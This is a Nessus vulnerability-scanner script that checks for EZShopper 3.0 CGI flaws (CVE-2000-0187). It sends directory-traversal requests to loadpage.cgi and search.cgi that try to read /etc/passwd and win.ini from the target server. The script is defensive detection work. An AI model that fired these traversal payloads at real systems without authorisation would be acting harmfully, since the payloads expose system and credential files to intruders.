#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10065);
 script_bugtraq_id(1014);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-2000-0187");
 
 name["english"] = "EZShopper 3.0";
 name["francais"] = "EZShopper 3.0";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
At least one of these CGI is installed :

	loadpage.cgi
	search.cgi
	
If they come from the package EZShopper 3.0, they
may be vulnerable to some security flaws that can
allow an intruder to view arbitrary files and/or
to execute arbitrary commands with the privileges of
the web server.

Solution : Make sure that you are running the latest
           version of EZShopper, 			
	   available at http://www.ahg.com/software.htm#ezshopper
Risk factor : High";	 

 desc["francais"] = "
Au moins un des CGI suivants est installé :

	loadpage.cgi
	search.cgi
	
S'ils proviennent du package EZShopper 3.0, alors
ils peuvent etre vulnérables à certains problèmes
de sécurité qui permettent à un intrus d'executer
des commandes arbitraires et/ou de lire des fichiers
sur le serveur web.

Solution : Vérifiez que vous faites tourner la derniere
           version de EZShopper, disponible à http://www.ahg.com/software.htm#ezshopper

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of EZShopper's CGIs";
 summary["francais"] = "Vérifie la présence des CGI EZShopper";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 if(is_cgi_installed_ka(item:dir+"/loadpage.cgi", port:port))
 {
req = string(dir, "/loadpage.cgi?user_id=1&file=../../../../../../etc/passwd");
req = http_get(item:req, port:port);
rep = http_keepalive_send_recv(port:port, data:req);
if(rep == NULL)exit(0);

if("root:" >< rep){
      security_hole(port);
      exit(0);
      }


req2 = string(dir,"/loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini");
req2 = http_get(item:req2, port:port);
rep2 = http_keepalive_send_recv(port:port, data:req2);
if( rep2 == NULL ) exit(0);


if("[windows]" >< rep2){
      security_hole(port);
      exit(0);
      }
 }

if(is_cgi_installed_ka(item:dir+"/search.cgi", port:port))
 {
req3 = string(dir,"/search.cgi?user_id=1&database=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini&template=..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini&distinct=1");
req3 = http_get(item:req3, port:port);
rep3 = http_keepalive_send_recv(port:port, data:req3);
if(rep3 == NULL)exit(0);

if("[windows]" >< rep3){
      security_hole(port);
      exit(0);
      }


req4 = string(dir, "/loadpage.cgi?user_id=1&database=../../../../../../etc/passwd&template=../../../../../../../../../etc/passwd&distinct=1");
req4 = http_get(item:req4, port:port);
rep4 = http_keepalive_send_recv(port:port, data:req4);
if("root:" >< rep4){
      security_hole(port);
      exit(0);
      }
  }   
}
